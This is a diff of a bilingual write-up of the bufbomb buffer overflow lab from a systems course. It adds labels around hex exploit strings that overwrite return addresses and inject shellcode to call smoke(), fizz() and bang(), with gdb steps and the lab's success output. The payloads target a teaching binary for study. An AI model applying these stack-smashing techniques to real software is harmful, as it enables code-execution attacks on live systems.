@@ -39,6 +39,7 @@ We get the same result 48.
 
 Finally, according to your own situation，turn the adress to the address of _somke()_ function： `08048ccc <smoke>:`
 
+十六进制结果为：
 ```
 00 00 00 00    
 00 00 00 00    
@@ -53,7 +54,7 @@ Finally, according to your own situation，turn the adress to the address of _so
 00 00 00 00    
 cc 8c 04 08
 ```
-
+终端返回：
 > Userid: hanggi    
  Cookie: 0x11c1be21    
  Type string:Smoke!: You called smoke()    
@@ -68,7 +69,7 @@ Let's use the following command to get our cookie.
 ```
 $ ./makecookie hanggi
 ```
-I got the value of 0x11c1be21.
+I got the value of *0x11c1be21*.
 
 
 这个是网上流行的一个版本：
@@ -93,6 +94,7 @@ I got the value of 0x11c1be21.
 也就是说，进入fizz的时候， **esp** 指向了ret address + 4 的单元。
 从代码可以看到 **esp** 减 *0x1c*，然后参数寄存器获取 **esp** 加 *0x20* 的内容作为与cookie 比较的值，我们只需把这一地址的值改为我们的cookie就可以了。
 
+十六进制结果为：
 ```
 00 00 00 00
 00 00 00 00
@@ -109,7 +111,7 @@ f3 8c 04 08
 00 00 00 00
 21 be c1 11
 ```
-
+终端返回：
 > Userid: hanggi    
  Cookie: 0x11c1be21    
  Type string:Fizz!: You called fizz(0x2a50279f)    
@@ -127,7 +129,7 @@ f3 8c 04 08
 0804d104 <global_value>:
  804d104:       00 00
 ```
-目前global_value的值为0，也可以看到cookie变量的地址，程序运行后会变为我们的cookie值。
+目前 *global_value* 的值为0，也可以看到cookie变量的地址，程序运行后会变为我们的cookie值。
 
 *bang()* 函数如下(网络版省略)：
 ```
@@ -165,7 +167,7 @@ $gdb bufbomb
 (gdb) r xx -u hanggi         (随便输入点字符让程序运行到断点位置)
 (gdb) p /x $eax              (以十六进制数字形式打印%eax中的内容)
 ```
-
+十六进制结果为：
 ```
 c7 05 04 d1
 04 08 21 be
@@ -180,13 +182,15 @@ c1 11 68 4c
 00 00 00 00
 78 3b 68 55
 ```
-
+终端返回：
 > Userid: hanggi    
  Cookie: 0x11c1be21    
  Type string:Bang!: You set global_value to 0x11c1be21    
  VAILD    
 > NICE JOB!
 
+
+## level 3
 
 ## title
 
